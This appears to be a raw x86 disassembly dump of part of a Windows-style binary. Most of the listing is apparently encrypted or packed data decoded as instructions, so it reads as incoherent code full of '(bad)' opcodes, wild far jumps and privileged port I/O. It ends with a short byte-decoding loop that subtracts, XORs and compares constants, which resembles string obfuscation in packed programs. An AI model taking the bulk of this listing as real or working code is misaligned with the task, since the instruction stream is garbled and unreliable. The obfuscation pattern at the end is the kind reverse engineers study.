  41a6cf:	jl     0x9b683aae
  41a6d5:	jno    0x41a65d
  41a6d7:	pop    edx
  41a6d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6d9:	test   eax,0xd5b4ff14
  41a6de:	test   DWORD PTR [esi+eiz*8+0x5a],esp
  41a6e2:	ret    0x3d0b
  41a6e5:	cmc    
  41a6e6:	sub    edi,esi
  41a6e8:	mov    ds:0x373c066d,al
  41a6ed:	(bad)  
  41a6ee:	lods   eax,DWORD PTR ds:[esi]
  41a6ef:	fnsave [esi+0x1b]
  41a6f2:	pusha  
  41a6f3:	mov    al,0x78
  41a6f5:	xor    DWORD PTR [eax-0x31],0x6c4d9b7b
  41a6fc:	mov    cl,0x9e
  41a6fe:	out    dx,eax
  41a6ff:	(bad)  
  41a700:	jmp    0x7a5bfccc
  41a705:	outs   dx,BYTE PTR ds:[esi]
  41a706:	sbb    al,0x4
  41a708:	pop    ss
  41a709:	cmp    al,0xcf
  41a70b:	loopne 0x41a744
  41a70d:	jmp    0x4e55892f
  41a712:	push   ecx
  41a713:	xor    al,BYTE PTR [edi-0x41]
  41a716:	cmp    DWORD PTR [ebp+0x798c471],ebx
  41a71c:	inc    esi
  41a71d:	pop    edx
  41a71e:	or     ebp,ebp
  41a720:	repz adc al,0xb9
  41a723:	jmp    0x8530d265
  41a728:	dec    ebx
  41a729:	pop    ebp
  41a72a:	bound  edx,QWORD PTR [esi+0x35a1e33c]
  41a730:	test   DWORD PTR [ebx+ecx*4+0x4c],esi
  41a734:	xchg   ebx,eax
  41a735:	jbe    0x41a782
  41a737:	mov    esp,0xfa39b8c5
  41a73c:	jnp    0x41a7a8
  41a73e:	stos   DWORD PTR es:[edi],eax
  41a73f:	add    BYTE PTR [ebp-0x5c],bl
  41a742:	cmp    bh,BYTE PTR [eax+0x2e089051]
  41a748:	mov    ebp,0x23fe37e
  41a74d:	in     al,0x20
  41a74f:	stos   DWORD PTR es:[edi],eax
  41a750:	icebp  
  41a751:	adc    edx,DWORD PTR [edx]
  41a753:	in     eax,0xf2
  41a755:	sub    ch,BYTE PTR [ecx]
  41a757:	xchg   esi,eax
  41a758:	shr    ebx,cl
  41a75a:	sbb    DWORD PTR [edi+esi*2+0xa083a02],ecx
  41a761:	dec    eax
  41a762:	lds    eax,FWORD PTR [ebx]
  41a764:	loop   0x41a7b9
  41a766:	xchg   esi,eax
  41a768:	and    edx,DWORD PTR [esi]
  41a76a:	adc    al,0xc8
  41a76c:	call   0xa1c8:0xd73df13
  41a773:	sbb    al,0x3c
  41a776:	add    ebp,DWORD PTR [ecx-0x48]
  41a779:	push   ds
  41a77a:	pop    esp
  41a77b:	ds ret 0x7edf
  41a77f:	mov    dh,0x14
  41a781:	or     al,0xdc
  41a783:	test   DWORD PTR [eax+0x2c],ebx
  41a786:	test   eax,0x14ee1948
  41a78b:	sar    ebx,1
  41a78d:	mov    dh,0xba
  41a78f:	popf   
  41a790:	add    esi,edi
  41a792:	ror    DWORD PTR [edx],1
  41a794:	fisttp QWORD PTR [ebx+eax*2+0x3f]
  41a798:	retf   
  41a799:	out    dx,al
  41a79a:	mov    esp,0xa2a7a824
  41a79f:	repz cmc 
  41a7a1:	sti    
  41a7a2:	(bad)  
  41a7a3:	dec    ebx
  41a7a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a7a5:	xchg   esp,eax
  41a7a6:	sbb    eax,0xbb9ed87b
  41a7ab:	or     DWORD PTR [ebx+eax*2+0x4cf45942],edi
  41a7b2:	jns    0x41a80b
  41a7b4:	inc    cl
  41a7b6:	dec    esp
  41a7b7:	mov    ah,0x71
  41a7b9:	mov    WORD PTR [eax+0x689301c1],di
  41a7c0:	test   BYTE PTR [edi-0x30],bh
  41a7c3:	idiv   edi
  41a7c5:	cmp    al,BYTE PTR [ecx-0x68]
  41a7c8:	push   edx
  41a7c9:	test   BYTE PTR [esi],0x6b
  41a7cc:	pop    ss
  41a7cd:	add    BYTE PTR [esi],bl
  41a7cf:	pop    ebx
  41a7d0:	in     al,0x1
  41a7d2:	jp     0x41a7c9
  41a7d4:	jp     0x41a766
  41a7d6:	and    DWORD PTR [esi-0x3b],ebx
  41a7d9:	and    edx,DWORD PTR [esi]
  41a7db:	mov    cl,0x13
  41a7dd:	iret   
  41a7de:	daa    
  41a7df:	xor    ebx,DWORD PTR [ebx-0x4f6f4559]
  41a7e5:	dec    BYTE PTR [eax]
  41a7e7:	xor    edx,ebx
  41a7e9:	and    BYTE PTR [eax+0x6d],cl
  41a7ec:	icebp  
  41a7ed:	scas   al,BYTE PTR es:[edi]
  41a7ee:	jecxz  0x41a861
  41a7f0:	jmp    0xc57a2445
  41a7f5:	xchg   esp,eax
  41a7f6:	pop    edi
  41a7f7:	mov    eax,0x517056d7
  41a7fc:	adc    al,0x50
  41a7fe:	push   es
  41a7ff:	fild   DWORD PTR [eax+edi*1-0x56]
  41a803:	bound  edi,QWORD PTR [ebp-0x67163abb]
  41a809:	(bad)  
  41a80a:	mov    ah,BYTE PTR [ecx]
  41a80c:	mov    ecx,0xca59d7df
  41a811:	mov    edi,0xffe4ecb3
  41a816:	sbb    al,bh
  41a818:	add    BYTE PTR [edi+0x14],al
  41a81b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a81c:	sar    BYTE PTR [ebx+edi*8-0x2],0xe
  41a821:	call   0x8d8e:0xf24c88d5
  41a828:	pop    ds
  41a829:	data16 das 
  41a82b:	xlat   BYTE PTR ds:[ebx]
  41a82c:	inc    edx
  41a82d:	(bad)  
  41a82e:	leave  
  41a82f:	push   ss
  41a830:	push   es
  41a831:	dec    esp
  41a832:	jbe    0x41a82e
  41a834:	inc    eax
  41a835:	jecxz  0x41a81d
  41a837:	ror    ch,1
  41a839:	out    0xc9,eax
  41a83b:	push   0x61e2e034
  41a840:	pop    ss
  41a841:	lahf   
  41a842:	pop    ss
  41a843:	mov    esi,0xf064ab22
  41a848:	jnp    0x41a892
  41a84a:	cmp    BYTE PTR es:[ebp+0x1c],cl
  41a84e:	xor    al,0xfc
  41a850:	jmp    0xc908:0x8e1eb594
  41a857:	push   ecx
  41a858:	fadd   QWORD PTR [edx-0x77]
  41a85b:	std    
  41a85c:	push   0x1a40abc5
  41a861:	retf   
  41a862:	xor    dh,dh
  41a864:	(bad)  
  41a868:	lods   eax,DWORD PTR ds:[esi]
  41a869:	rol    DWORD PTR [edi-0x56],0xd7
  41a86d:	push   esp
  41a86e:	retf   
  41a86f:	sbb    ebx,DWORD PTR [ebp-0x1d]
  41a872:	gs scas al,BYTE PTR es:[edi]
  41a874:	loope  0x41a833
  41a876:	int    0x8e
  41a878:	push   ss
  41a879:	loope  0x41a846
  41a87b:	push   eax
  41a87c:	pop    esi
  41a87d:	ds dec edi
  41a87f:	fsubp  st(3),st
  41a881:	fnsave [edx+0x68]
  41a884:	mov    bh,0xd8
  41a886:	mov    dh,0x68
  41a888:	pop    esi
  41a889:	inc    eax
  41a88a:	mov    al,0x91
  41a88c:	or     al,0xdf
  41a88e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a88f:	jle    0x41a85b
  41a891:	adc    al,0x87
  41a893:	sbb    bl,BYTE PTR [esp+ebp*8]
  41a896:	es and eax,0x90df77b5
  41a89c:	sbb    DWORD PTR [edi+0x1660d5f0],esp
  41a8a2:	aam    0x83
  41a8a4:	(bad)  
  41a8a6:	in     al,dx
  41a8a7:	jl     0x41a8f4
  41a8a9:	xchg   edi,eax
  41a8aa:	stos   DWORD PTR es:[edi],eax
  41a8ab:	int3   
  41a8ac:	repnz pop eax
  41a8ae:	ror    DWORD PTR [edx-0x3b],1
  41a8b1:	and    dh,BYTE PTR [ecx+esi*8-0x4551be4c]
  41a8b8:	inc    ebx
  41a8b9:	jnp    0x41a898
  41a8bb:	sub    eax,ecx
  41a8bd:	or     DWORD PTR [edi+esi*1],esp
  41a8c0:	pushf  
  41a8c1:	jmp    0x41a91f
  41a8c3:	xchg   BYTE PTR [edx+0x40cdd702],cl
  41a8c9:	adc    eax,0x2dc54a63
  41a8ce:	add    eax,0x9a191225
  41a8d3:	adc    DWORD PTR [ecx],esi
  41a8d5:	or     al,0xa7
  41a8d7:	lea    ebx,[ecx]
  41a8d9:	(bad)  [ecx-0x1e60d0f0]
  41a8df:	out    0xfe,al
  41a8e1:	jge    0x41a8b4
  41a8e3:	push   es
  41a8e4:	add    eax,0x351ed6f4
  41a8e9:	push   edx
  41a8ea:	or     al,0x90
  41a8ec:	mov    bl,0x50
  41a8ee:	lahf   
  41a8ef:	pushf  
  41a8f0:	mul    BYTE PTR [ebp+edx*1+0x2f]
  41a8f4:	jb     0x41a8b8
  41a8f6:	dec    ecx
  41a8f7:	xor    ch,ch
  41a8f9:	or     DWORD PTR [ebp-0x35003f42],eax
  41a8ff:	dec    esp
  41a900:	push   es
  41a901:	cmp    ah,cl
  41a903:	jne    0x41a929
  41a905:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a906:	imul   esp,DWORD PTR [eax+0xb],0x990e2db
  41a90d:	icebp  
  41a90e:	idiv   DWORD PTR [ecx]
  41a910:	imul   DWORD PTR [esi-0x3a78e219]
  41a916:	sub    al,0x71
  41a918:	mov    ch,0xa2
  41a91a:	pop    ds
  41a91b:	xchg   ecx,eax
  41a91c:	int    0xbe
  41a91e:	pop    ebp
  41a91f:	and    eax,0x3ded4b8b
  41a924:	(bad)  
  41a925:	push   0xfffffffa
  41a927:	shl    dh,1
  41a929:	jle    0x41a990
  41a92b:	pusha  
  41a92c:	push   ds
  41a92d:	push   0x4c
  41a92f:	into   
  41a930:	test   BYTE PTR [edi-0x12],0xa8
  41a934:	mov    eax,ds:0xc3b9a916
  41a939:	jp     0x41a98a
  41a93b:	retf   0xe87b
  41a93e:	jge    0x41a969
  41a940:	retf   0x3baa
  41a943:	out    dx,eax
  41a944:	fs test al,ch
  41a947:	xor    al,0xb8
  41a949:	jo     0x41a932
  41a94b:	mov    ebx,0x771e6550
  41a950:	in     al,0xf5
  41a952:	cld    
  41a953:	iret   
  41a954:	in     al,dx
  41a955:	shl    al,1
  41a957:	aam    0x7
  41a959:	pop    ss
  41a95a:	mov    ah,0x64
  41a95c:	jle    0x41a913
  41a95e:	xor    BYTE PTR [esp-0x389f3f4d],dl
  41a965:	add    ecx,DWORD PTR [edx+0x4a9fab1e]
  41a96b:	out    0x55,al
  41a96d:	retf   
  41a96e:	pushf  
  41a96f:	push   edi
  41a970:	xchg   esi,eax
  41a971:	lods   al,BYTE PTR ds:[esi]
  41a972:	pop    es
  41a973:	xchg   DWORD PTR [esi],ebx
  41a975:	push   esi
  41a976:	and    al,0x53
  41a978:	in     eax,dx
  41a979:	ror    BYTE PTR [ebx],cl
  41a97b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a97c:	mov    eax,ds:0x9bcac284
  41a981:	lods   eax,DWORD PTR ds:[esi]
  41a982:	retf   0xe508
  41a985:	lds    ebx,FWORD PTR [bp+di-0x2dc1]
  41a98a:	fsub   QWORD PTR [esi+0x2ca2e1e9]
  41a990:	test   BYTE PTR [esi-0x407b17fc],ch
  41a996:	jg     0x41a944
  41a998:	in     eax,dx
  41a999:	push   ecx
  41a99a:	cwde   
  41a99b:	addr16 retf 0x745
  41a99f:	(bad)  
  41a9a0:	cmc    
  41a9a1:	ins    DWORD PTR es:[edi],dx
  41a9a2:	repnz in al,0x35
  41a9a5:	(bad)  
  41a9a6:	jecxz  0x41aa18
  41a9a8:	retf   
  41a9a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a9aa:	mov    bl,0xf7
  41a9ac:	aaa    
  41a9ad:	test   DWORD PTR [ebp+0x45c3ac61],esp
  41a9b3:	movaps XMMWORD PTR [ebx+0x2d],xmm5
  41a9b7:	clc    
  41a9b8:	aas    
  41a9b9:	sub    eax,0x3a07edc4
  41a9be:	xchg   ebx,eax
  41a9bf:	repz sbb eax,0xc2ea323
  41a9c5:	jmp    DWORD PTR [ecx]
  41a9c7:	dec    esp
  41a9c8:	nop
  41a9c9:	ffreep st(6)
  41a9cb:	ficomp WORD PTR [eax-0x11d8889d]
  41a9d1:	xor    BYTE PTR [ebx+edx*1+0x6dab133b],ah
  41a9d8:	mov    eax,0xf07ea2bc
  41a9dd:	mov    edx,0xea0616ed
  41a9e2:	sbb    BYTE PTR [ecx+0x7cf77f8e],0xda
  41a9e9:	scas   al,BYTE PTR es:[edi]
  41a9ea:	add    eax,0x2a59737e
  41a9ef:	jmp    0x3e0c:0x2f9717c8
  41a9f6:	mov    eax,0x3d704912
  41a9fb:	mov    ds:0x357d3829,al
  41aa00:	rol    DWORD PTR [ecx+0x66],1
  41aa03:	inc    ebp
  41aa04:	(bad)  
  41aa05:	push   0x728b85c9
  41aa0a:	(bad)  
  41aa0b:	mov    al,gs:0x14f7eacd
  41aa11:	addr16 in eax,0xad
  41aa14:	out    0x80,eax
  41aa16:	out    0xf6,eax
  41aa18:	icebp  
  41aa19:	pop    esp
  41aa1a:	fdiv   st(2),st
  41aa1c:	stos   BYTE PTR es:[edi],al
  41aa1d:	loop   0x41aa65
  41aa1f:	and    DWORD PTR [ecx],esi
  41aa21:	imul   DWORD PTR [edx]
  41aa23:	bound  ecx,QWORD PTR [esi+0x68]
  41aa26:	xchg   edi,eax
  41aa27:	or     BYTE PTR [edx+0x1c],0xad
  41aa2b:	mov    esp,0xaf6b83fd
  41aa30:	sbb    BYTE PTR [ebp-0x15],ah
  41aa33:	call   FWORD PTR [ebx]
  41aa35:	xchg   edi,eax
  41aa36:	cmp    al,0x48
  41aa38:	ja     0x41aab0
  41aa3a:	dec    ebp
  41aa3b:	mov    ah,0x6e
  41aa3d:	push   ebp
  41aa3e:	stos   BYTE PTR es:[edi],al
  41aa3f:	lahf   
  41aa40:	and    al,0x37
  41aa42:	pop    gs
  41aa44:	scas   al,BYTE PTR es:[edi]
  41aa45:	sbb    BYTE PTR [ecx-0x5e],cl
  41aa48:	push   ss
  41aa49:	jbe    0x41aa63
  41aa4b:	mov    al,ds:0x3fe408d1
  41aa50:	test   eax,0x723b2213
  41aa55:	add    dl,BYTE PTR [ebp+0x486e13d7]
  41aa5b:	in     al,0xf0
  41aa5d:	mov    bl,0x9a
  41aa5f:	xor    bh,dl
  41aa61:	shl    BYTE PTR ds:0x52bede22,0x36
  41aa68:	imul   edx,DWORD PTR [eax-0x54e4fd53],0x2b
  41aa6f:	(bad)  
  41aa70:	std    
  41aa71:	pushf  
  41aa72:	mov    bl,0x4f
  41aa74:	dec    edx
  41aa75:	add    al,0x60
  41aa77:	lods   eax,DWORD PTR ds:[esi]
  41aa78:	mov    eax,ds:0x578dfc56
  41aa7d:	scas   al,BYTE PTR es:[edi]
  41aa7e:	mov    eax,ds:0xf95f6f91
  41aa83:	dec    ebx
  41aa84:	stc    
  41aa85:	jmp    0x57d2126
  41aa8a:	icebp  
  41aa8b:	adc    BYTE PTR [esi-0x72],dl
  41aa8e:	xchg   ebp,eax
  41aa8f:	jnp    0x41aa3b
  41aa91:	push   edi
  41aa92:	addr16 pop edi
  41aa94:	adc    bl,BYTE PTR [ebx]
  41aa96:	cdq    
  41aa97:	sahf   
  41aa98:	out    0x33,eax
  41aa9a:	int3   
  41aa9b:	mov    dh,0xf5
  41aa9d:	out    0x10,eax
  41aa9f:	jl     0x41aa37
  41aaa1:	sub    dh,ah
  41aaa3:	jg     0x41aa97
  41aaa5:	or     BYTE PTR [eax],al
  41aaa7:	lahf   
  41aaa8:	imul   esi,DWORD PTR [edx],0x3eafb759
  41aaae:	das    
  41aaaf:	aas    
  41aab0:	dec    ecx
  41aab1:	pop    ecx
  41aab2:	mov    bl,0x62
  41aab4:	xchg   esi,eax
  41aab5:	lea    ebp,[ebx+edi*2]
  41aab8:	push   esi
  41aab9:	out    dx,eax
  41aaba:	jne    0x41aaa5
  41aabc:	push   es
  41aabd:	adc    al,0x7f
  41aabf:	mov    ch,0x59
  41aac1:	mov    ecx,DWORD PTR [ebx]
  41aac3:	xchg   edi,eax
  41aac4:	cmp    ebp,esp
  41aac6:	add    ebp,eax
  41aac8:	repnz fbld TBYTE PTR [ecx]
  41aacb:	adc    ebp,eax
  41aacd:	jge    0x41aaa3
  41aacf:	aam    0x11
  41aad1:	sbb    eax,0xccd4f4e3
  41aad6:	cmp    eax,0x77f42237
  41aadb:	out    0xde,al
  41aadd:	shl    DWORD PTR fs:[esi+edx*2-0x4b5861ce],cl
  41aae5:	pop    ecx
  41aae6:	mov    ebx,0x5c2d2928
  41aaeb:	and    al,0x67
  41aaed:	aad    0xec
  41aaef:	mov    ebp,0x1a710902
  41aaf4:	imul   edi,DWORD PTR [ecx-0x6cd324e],0x79e10b83
  41aafe:	mov    bl,0xf4
  41ab00:	sbb    bh,cl
  41ab02:	js     0x41aa9e
  41ab04:	hlt    
  41ab05:	lock test al,0xcc
  41ab08:	cli    
  41ab09:	stc    
  41ab0a:	xor    ebx,edi
  41ab0c:	mov    BYTE PTR [edx+0xc26a4fa],0x12
  41ab13:	and    ebx,DWORD PTR [edx+0x358a178e]
  41ab19:	mov    ebp,cs
  41ab1b:	shl    DWORD PTR ds:0xb90dff97,1
  41ab21:	xor    eax,0xaacb9b2e
  41ab26:	sub    al,0xeb
  41ab28:	inc    ebp
  41ab2a:	mov    edx,0x20bffa25
  41ab2f:	add    al,0x61
  41ab31:	lods   eax,DWORD PTR ds:[esi]
  41ab32:	mov    dh,0xdc
  41ab34:	fld    DWORD PTR [ebp-0x6704fe2b]
  41ab3a:	out    0x1b,eax
  41ab3c:	mov    dh,0x92
  41ab3e:	xchg   edi,eax
  41ab3f:	jns    0x41aaf9
  41ab41:	push   edx
  41ab42:	or     edx,DWORD PTR [ebx]
  41ab44:	aaa    
  41ab45:	fsub   QWORD PTR [ebx-0x27]
  41ab48:	loopne 0x41ab6f
  41ab4a:	push   ecx
  41ab4b:	sbb    al,0xf7
  41ab4d:	rcr    BYTE PTR [edx+0x79],cl
  41ab50:	das    
  41ab51:	inc    edi
  41ab52:	push   ds
  41ab53:	hlt    
  41ab54:	push   0x2b
  41ab56:	hlt    
  41ab57:	push   esi
  41ab58:	hlt    
  41ab59:	lods   al,BYTE PTR ds:[esi]
  41ab5a:	test   al,0xd7
  41ab5c:	loope  0x41aae1
  41ab5e:	xor    al,0xd
  41ab60:	mov    ds:0x18941b57,al
  41ab65:	popa   
  41ab66:	xor    bl,bh
  41ab68:	cmc    
  41ab69:	into   
  41ab6a:	mov    ah,0xfa
  41ab6c:	or     cl,BYTE PTR [ecx+ebx*8]
  41ab6f:	jg     0x41ab72
  41ab71:	arpl   WORD PTR [esi],bp
  41ab73:	ret    
  41ab74:	lock push eax
  41ab76:	or     dl,ah
  41ab78:	mov    dh,0xf1
  41ab7a:	popa   
  41ab7b:	inc    esp
  41ab7c:	xor    al,0x13
  41ab7e:	pop    ss
  41ab7f:	mov    esp,0x5a011085
  41ab84:	sbb    BYTE PTR [esi+ebp*1],al
  41ab87:	imul   ebp,edx,0x28
  41ab8a:	stc    
  41ab8b:	jl     0x41abef
  41ab8d:	ins    BYTE PTR es:[edi],dx
  41ab8e:	adc    BYTE PTR [ebx-0x1d],cl
  41ab91:	int3   
  41ab92:	fst    DWORD PTR [edx-0x2064eeac]
  41ab98:	fsub   DWORD PTR [edx]
  41ab9a:	sti    
  41ab9b:	and    al,BYTE PTR [eax-0x13f107e2]
  41aba1:	pop    es
  41aba2:	je     0x41abfc
  41aba4:	ror    DWORD PTR [ebx-0x19],0x23
  41aba8:	ja     0x41ab44
  41abaa:	xor    DWORD PTR [ebx-0x48540850],0x699e63b4
  41abb4:	lock and bh,bh
  41abb7:	fmul   DWORD PTR [ebp-0x411641b7]
  41abbd:	bound  eax,QWORD PTR [eax]
  41abbf:	cmp    ch,BYTE PTR [eax]
  41abc1:	ficom  DWORD PTR [esi+0x35]
  41abc4:	repnz in al,dx
  41abc6:	daa    
  41abc7:	mov    dl,0x98
  41abc9:	test   BYTE PTR [edx-0x4d43d0c5],bh
  41abcf:	idiv   DWORD PTR [ecx+0x34]
  41abd2:	jg     0x41abbe
  41abd4:	push   0x2c
  41abd6:	call   0xc8ec:0xec682f38
  41abdd:	or     cl,BYTE PTR [ebx+0x64]
  41abe0:	mov    DWORD PTR [ecx],ebx
  41abe2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41abe3:	jp     0x41abea
  41abe5:	push   es
  41abe6:	adc    dl,bl
  41abe8:	xor    eax,0x16b3900a
  41abed:	ret    0xa7d8
  41abf0:	rcr    DWORD PTR [ebp-0x56378768],cl
  41abf6:	mov    dl,0xd6
  41abf8:	jno    0x41ac1d
  41abfa:	push   edx
  41abfb:	or     bh,0x95
  41abfe:	int3   
  41abff:	lock outs dx,BYTE PTR ds:[esi]
  41ac01:	xchg   ecx,eax
  41ac02:	inc    edi
  41ac03:	fmul   DWORD PTR [edx-0x2b]
  41ac06:	ss or  al,0x68
  41ac09:	retf   0x540
  41ac0c:	pop    esp
  41ac0d:	jbe    0x41abbb
  41ac0f:	(bad)  
  41ac10:	jg     0x41abe0
  41ac12:	xchg   esi,eax
  41ac13:	xor    esp,eax
  41ac15:	sbb    bh,cl
  41ac17:	fcomp  DWORD PTR [edx]
  41ac19:	xor    edx,DWORD PTR [edx-0x3d]
  41ac1c:	mov    al,ds:0x39875585
  41ac21:	lods   al,BYTE PTR ds:[esi]
  41ac22:	dec    esp
  41ac23:	inc    DWORD PTR [ebx-0x5c]
  41ac26:	inc    edi
  41ac27:	mov    dl,0xa8
  41ac29:	xor    ah,cl
  41ac2b:	mov    al,0xa6
  41ac2d:	dec    esi
  41ac2e:	rcr    BYTE PTR [ecx+0x33],1
  41ac31:	xchg   edx,eax
  41ac32:	iret   
  41ac33:	sbb    cl,BYTE PTR [edi-0x37]
  41ac36:	addr16 inc esi
  41ac38:	pop    ds
  41ac39:	mov    ch,0x13
  41ac3b:	xchg   esp,eax
  41ac3c:	sbb    esi,eax
  41ac3e:	sbb    DWORD PTR es:[edi+edx*4-0x2a],ecx
  41ac43:	mov    al,ds:0x71dd0863
  41ac48:	fbstp  TBYTE PTR [edi]
  41ac4a:	add    al,BYTE PTR [ebx]
  41ac4c:	jae    0x41ac32
  41ac4e:	inc    ebp
  41ac4f:	mov    dl,0xa6
  41ac51:	xchg   ebp,eax
  41ac52:	icebp  
  41ac53:	sub    DWORD PTR [ecx+0x78],eax
  41ac56:	cmp    eax,0xd10ea49f
  41ac5b:	sub    al,0xdb
  41ac5d:	stos   DWORD PTR es:[edi],eax
  41ac5e:	adc    al,0x1
  41ac60:	std    
  41ac61:	pop    ss
  41ac62:	mov    ebp,0x7623ec56
  41ac67:	jle    0x41ac4f
  41ac69:	call   0xbd65:0x6fd99b31
  41ac70:	xchg   ebp,eax
  41ac71:	(bad)  
  41ac72:	jge    0x41aca7
  41ac74:	js     0x9d8d233e
  41ac7a:	ins    DWORD PTR es:[edi],dx
  41ac7b:	out    0xd8,al
  41ac7d:	pushf  
  41ac7e:	dec    edx
  41ac7f:	and    al,0xc4
  41ac81:	aaa    
  41ac82:	(bad)  
  41ac83:	stos   BYTE PTR es:[edi],al
  41ac84:	out    0xa3,eax
  41ac86:	fcmovbe st,st(2)
  41ac88:	sub    al,0x19
  41ac8a:	in     al,0x2c
  41ac8c:	mov    ds:0x32fb826f,eax
  41ac91:	cli    
  41ac92:	and    al,0x75
  41ac94:	bound  edx,QWORD PTR [esi]
  41ac96:	sbb    BYTE PTR [ebx+0x19],ah
  41ac99:	mov    ds:0xa90798ed,eax
  41ac9e:	jo     0x41ac6c
  41aca0:	adc    bl,BYTE PTR [ebp+0x39]
  41aca3:	xor    ebx,DWORD PTR [esi]
  41aca5:	in     eax,dx
  41aca6:	out    0xc9,eax
  41aca8:	call   0xba99:0x61ad183d
  41acaf:	dec    esi
  41acb0:	add    BYTE PTR [esi],bl
  41acb2:	lock ficom DWORD PTR [esi+0x7f]
  41acb6:	ss jmp 0x41ac85
  41acb9:	jns    0x41ac6b
  41acbb:	scas   eax,DWORD PTR es:[edi]
  41acbc:	mov    ecx,0xb00a1fd7
  41acc1:	ret    
  41acc2:	xchg   DWORD PTR [ebp+0x4d],esi
  41acc5:	or     eax,0x336d77c7
  41acca:	sub    ecx,ecx
  41accc:	ins    BYTE PTR es:[edi],dx
  41accd:	xchg   DWORD PTR [eax+0x31],ebp
  41acd0:	enter  0x942f,0x46
  41acd4:	jmp    0x41acfe
  41acd6:	sub    DWORD PTR [eax],esi
  41acd8:	jp     0x41accb
  41acda:	jle    0x41ad33
  41acdc:	nop
  41acdd:	xor    ch,BYTE PTR [edx-0x55]
  41ace0:	mov    eax,ds:0xfed6ea98
  41ace5:	xor    ah,BYTE PTR [esi-0xe]
  41ace8:	pop    edi
  41ace9:	int    0x85
  41aceb:	mov    al,0x55
  41aced:	out    0x1d,al
  41acef:	sbb    ebp,DWORD PTR [edx]
  41acf1:	sti    
  41acf2:	dec    esp
  41acf3:	push   cs
  41acf4:	mov    WORD PTR [eax-0x7383d4b6],cs
  41acfa:	dec    edx
  41acfb:	inc    esi
  41acfc:	inc    esi
  41acfd:	lea    edx,ds:0xc2c9e8a0
  41ad03:	sub    eax,0xa39a54d1
  41ad08:	xchg   edi,eax
  41ad09:	in     eax,dx
  41ad0a:	cmp    dl,BYTE PTR [esi]
  41ad0c:	sbb    al,0x8e
  41ad0e:	jno    0x41ace9
  41ad10:	xor    BYTE PTR [edi-0x73],al
  41ad13:	or     esi,ecx
  41ad15:	add    ch,BYTE PTR [edx+ebp*2-0x5b1b10]
  41ad1c:	sar    DWORD PTR [edx+0x652ed9bd],0x32
  41ad23:	enter  0x7c13,0x10
  41ad27:	enter  0xbd63,0x69
  41ad2b:	in     al,dx
  41ad2c:	lock jmp 0x41acca
  41ad2f:	ret    0xea9e
  41ad32:	icebp  
  41ad33:	scas   eax,DWORD PTR es:[edi]
  41ad34:	repnz and edi,eax
  41ad37:	inc    ecx
  41ad38:	adc    bh,BYTE PTR [ecx+0x3ca77dfe]
  41ad3e:	dec    ebx
  41ad3f:	push   0xcd91da72
  41ad44:	ds jb  0x41ad3b
  41ad47:	jb     0x41ad33
  41ad49:	ret    0xdaf7
  41ad4c:	cmp    eax,DWORD PTR [edx]
  41ad4e:	mov    esi,0x159d03e7
  41ad53:	push   0xffffffe1
  41ad55:	cld    
  41ad56:	xor    bh,BYTE PTR [ebp+0x25c94d4b]
  41ad5c:	enter  0x8b11,0x51
  41ad60:	aam    0xdd
  41ad62:	mov    esi,0x1204bbf3
  41ad67:	push   ds
  41ad68:	jg     0x41ad23
  41ad6a:	or     esi,DWORD PTR [edx+0x6e6530ff]
  41ad70:	cmp    al,0x5f
  41ad72:	icebp  
  41ad73:	push   esp
  41ad74:	loopne 0x41ad1d
  41ad76:	mov    ?,WORD PTR [ebx+ebp*2-0x4205b04e]
  41ad7d:	popa   
  41ad7e:	imul   ebp,DWORD PTR [ebx],0xd2ff0292
  41ad84:	sub    esp,DWORD PTR [esi]
  41ad86:	loope  0x41ad27
  41ad88:	xchg   bh,dh
  41ad8a:	inc    ebp
  41ad8b:	rcr    DWORD PTR [ecx],1
  41ad8d:	test   BYTE PTR [eax+0xbedabda],dh
  41ad93:	ins    BYTE PTR es:[edi],dx
  41ad94:	or     al,0x98
  41ad96:	sti    
  41ad97:	mov    dl,0xae
  41ad99:	jp     0x41ad5c
  41ad9b:	mov    ds:0xa5715e50,al
  41ada0:	mov    WORD PTR [edi],es
  41ada2:	fstp   QWORD PTR [ebx+ebx*8-0x62]
  41ada6:	sbb    ah,BYTE PTR [ecx]
  41ada8:	lods   al,BYTE PTR ds:[esi]
  41ada9:	add    eax,0x1d04eec1
  41adae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41adaf:	mov    eax,0x96ed6123
  41adb4:	push   esi
  41adb5:	sbb    esp,0xe
  41adb8:	rol    BYTE PTR [ebx-0x9e07c],cl
  41adbe:	sub    ah,ah
  41adc0:	(bad)  
  41adc1:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41adc3:	mov    ebx,0x1e5986b8
  41adc8:	add    BYTE PTR [edi],cl
  41adca:	outs   dx,BYTE PTR ds:[esi]
  41adcb:	arpl   sp,bp
  41adcd:	pop    ecx
  41adce:	mov    esp,0x783bd6fa
  41add3:	mov    cl,0x35
  41add5:	leave  
  41add6:	aam    0x90
  41add8:	add    BYTE PTR [ecx-0x20],dl
  41addb:	mov    cl,0xa0
  41addd:	int    0x73
  41addf:	call   0xd18e1841
  41ade4:	popa   
  41ade5:	cwde   
  41ade6:	movhps xmm7,QWORD PTR [eax+ebx*1-0x7f]
  41adeb:	inc    edx
  41adec:	mov    DWORD PTR [ebp-0x8],eax
  41adef:	push   DWORD PTR [ebp+0x18]
  41adf2:	jmp    0x41ae4b
  41adf7:	mov    ecx,DWORD PTR [ebp-0x8]
  41adfa:	add    ecx,eax
  41adfc:	mov    DWORD PTR [ebp-0x14],ecx
  41adff:	mov    ecx,DWORD PTR [ebp-0x14]
  41ae02:	mov    ecx,DWORD PTR [ecx+0xc]
  41ae05:	movsx  cx,BYTE PTR [ecx+eax*1]
  41ae0a:	mov    edx,0x3b4b
  41ae0f:	sub    cx,dx
  41ae12:	mov    edx,0x8a85
  41ae17:	xor    cx,dx
  41ae1a:	mov    edx,0x4f85
  41ae1f:	cmp    cx,dx
  41ae22:	jne    0x41adef
  41ae28:	mov    ecx,DWORD PTR ds:0x421c16
  41ae2e:	mov    ecx,DWORD PTR [ecx+0x198]
  41ae34:	mov    DWORD PTR [ecx],eax
  41ae36:	jmp    0x41ae5c
